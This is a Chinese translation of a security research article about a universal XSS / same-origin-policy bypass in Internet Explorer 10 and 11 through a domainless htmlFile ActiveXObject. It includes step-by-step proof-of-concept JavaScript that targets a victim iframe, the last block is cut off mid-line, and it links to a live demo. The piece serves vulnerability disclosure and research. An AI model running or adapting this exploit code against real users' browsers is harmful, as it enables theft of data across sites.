> 原文链接: https://www.anquanke.com//post/id/85790 


# 【技术分享】IE上的UXSS/SOP绕过-再次冒险在无域的世界


                                阅读量   
                                **94081**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：brokenbrowser.com
                                <br>原文地址：[http://www.brokenbrowser.com/uxss-ie-domainless-world/](http://www.brokenbrowser.com/uxss-ie-domainless-world/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p4.ssl.qhimg.com/t0187e8c675340d2aa4.jpg)](https://p4.ssl.qhimg.com/t0187e8c675340d2aa4.jpg)**

****

翻译：[scriptkid](http://bobao.360.cn/member/contribute?uid=2529059652)

稿费：100RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前言**

几个月前，我们曾在Edge上玩耍过[无域的about:blank](https://www.brokenbrowser.com/uxss-edge-domainless-world/)页面。基本上，一个强有力的about:blank document可以无限制地访问任何域。该问题在最近[关于CVE-2017-0002的补丁上得到修复](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0002)，所以将不再起作用。同样由[ActiveXObject/htmlFile](https://www.brokenbrowser.com/uxss-ie-htmlfile/)引发的问题也在上周关于[CVE-2017-0154](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0154)的补丁中被[修复](https://technet.microsoft.com/library/security/MS17-006)了。如果你还没有阅读过前面提到两种达到UXSS/SOP绕过方式的文章，请现在就去查阅下，因为我们接下来的内容将假设你已经熟悉这两种方式。我们今天的目标是将我们之前Edge上的bug利用移植到IE上，这将很容易，因为[微软对IE的不认真修复](https://www.brokenbrowser.com/on-patching-security-bugs/)。先看下这些漏洞当前的状态：

[![](https://p4.ssl.qhimg.com/t0187e87da5c914bcc8.png)](https://p4.ssl.qhimg.com/t0187e87da5c914bcc8.png)

**<br>**

**在IE上创建一个无域的about:blank**

在之前的bug上，我们使用data:uri来创建一个无域的blank，我们要怎么在IE上实现相同的结果呢？htmlFile再次给我们提供了帮助，因为补丁让我们无法再设置为任意域，但是我们依旧可以将其设置为blank或者无域。

为了创建一个无域的htmlFile，我们首先需要一个被销毁的document，也就是说，document将不复存在。我们如何在什么都没有的基础上创建东西？这是[Neil deGrasse Tyson](https://twitter.com/neiltyson)提出的另一个问题，我将做出最好的回复！事实上，思路很简单，我们只需要确保一切按照正确的顺序进行即可。

1、保存iframe的对ActiveXObject的引用

2、至少实例化一次htmlFile(这样IE就没有销毁掉它)

3、阻断iframe进程(这样IE就没有机会销毁我们的引用)

4、销毁iframe的document(用document.open)

5、再次实例化htmlFile，现在它是无域的了。

步骤2和3在这里非常重要，少了步骤2将导致我们无法保存一个可用的引用，少了步骤3将是IE可以销毁相应对象。我们之前已经在[这篇文章](https://www.brokenbrowser.com/uxss-ie-htmlfile/)中提到过线程阻断的思路。我们接下来将使用的线程阻断技术是非常直观的弹框。

<br>

**无域的htmlFile**

```
// We will attack the iframe below
// &lt;iframe name="victim_iframe" src="https://www.google.com/recaptcha/..."&gt;&lt;/iframe&gt;
 
// Render an iframe (we will destroy its document later)
document.body.insertAdjacentHTML('beforeEnd','&lt;iframe name="ifr"&gt;&lt;/iframe&gt;');
 
// Save a reference to its ActiveXObject
var ifr_ActiveXObject = ifr.ActiveXObject;
 
// Make sure IE does not invalidate our reference
new ifr_ActiveXObject("htmlFile"); // We don't even need save this instance
 
// Block the iFrame so the ActiveXObject object is never destroyed
ifr.setTimeout('alert("Do not close me until the PoC finishes, please.");');
```

你是否意识到我们使用了setTimeout来执行阻断弹框？这是因为我们还需要继续做其他事，如果我们直接在iframe弹框，这将阻断UI导致后续功能不执行。我们现在的目标是在弹框期间销毁iframe的内容。记住，弹框是用来阻止IE销毁ActiveXObject的。

现在我们将销毁iframe的document并创建无域的htmlFile。如果你对document.open不熟悉，那么在这个PoC中，你可以将其类比为document.write。

```
// Destroy the iframe document
ifr.document.open();
 
// Instantiate a domainless htmlFile
var domainlessDoc = new ifr_ActiveXObject("htmlFile");
```

现在，我们拥有了一个无域的htmlFile，我们所需要做的就仅仅是加载一个带有我们要访问的URL的iframe了。具体的做法在之前的[冒险在无域的世界](https://www.brokenbrowser.com/uxss-edge-domainless-world/)文章中提到过了。实质上，我们通过iframe加载任意的网站，将其修改为about：blank(iframe所属域)。接着我们就可以通过我们的无域htmlFile任意访问该blank(绕过SOP)。

```
// Inject the code in victim's inner iframe
domainlessDoc.parentWindow.setTimeout("victim_iframe[0].location = 'javascript:alert(pare
```

上述适用于IE10和IE11，但只要稍微调整即可适用于IE6到IE11.我们不会在这里做调整，但如果你真的好奇，请[让我知道](https://twitter.com/magicmac2000)。

[![](https://p0.ssl.qhimg.com/t01a146c44529b1e391.png)](https://p0.ssl.qhimg.com/t01a146c44529b1e391.png)

[**[IE10/11上的PoC]******](http://www.cracking.com.ar/demos/ieuxssdomainless)

记住，htmlFile还有许多玩法在等着被发现，我相信这值得你花费一个下雨的午后来研究它。在我看来，修复htmlFile相关的bug的最好方式是完全禁止它在iexplore.exe上的实例化。

```
// If this code returns ACCESS_DENIED attackers will lose an amazing weapon
new ActiveXObject("htmlFile");  // Do not allow this anymore!
```
